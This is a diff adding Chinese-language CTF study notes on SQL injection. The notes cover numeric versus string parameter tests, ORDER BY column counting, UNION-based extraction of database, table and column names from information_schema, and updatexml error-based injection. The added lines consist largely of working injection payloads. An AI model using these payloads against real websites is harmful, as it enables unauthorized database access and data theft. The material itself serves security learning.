@@ -46,4 +46,46 @@ if __name__ == "__main__":
 ```
 需要几分钟才能跑完![alt text](image-44.png)
 
-# 2.[SWPU2019]Web1
+# 字符型-数字型判断
+- 数字型：
+?id=1 and 1=1#
+?id=1 and 1=2#
+如果是数字型，第一条正确回显，第二条报错
+
+- 字符型：
+?id=1' and 1=1#
+?id=1' and 1=2#
+如果是字符型，第一条正确，第二条报错
+\# 有时需要替换成 --+ 或者 %23
+
+- 爆列数，这里以字符型举例
+?id=1' order by 3--+
+依次增加，直到报错的上一个数字就是列数
+
+- 联合注入查询数据库名，以字段数为3举例
+?id=-1' union select 1,2,database()--+
+
+- 联合注入查询数据库中的表名
+?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='note'--+
+?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='note')--+
+
+- 联合注入查询表中的字段名
+?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='fl4g')--+
+
+- 联合查询属性值
+?id=-1' union select 1,2,fllllag from fl4g--+
+
+# 报错注入
+https://blog.csdn.net/m0_60988110/article/details/123544853
+- 原理：
+updatexml(xml_doument,XPath_string,new_value)
+第一个参数：XML的内容
+第二个参数：是需要update的位置XPATH路径
+第三个参数：是更新后的内容
+
+name=1' and updatexml(1,version(),1)#
+version()不符合XPATH语法，发生报错
+
+name=1' and updatexml(1,concat(0x7e,version()),1)#
+0x7e 让XPATH校验失败，version()是真正想查询的内容，使用concat连接
+
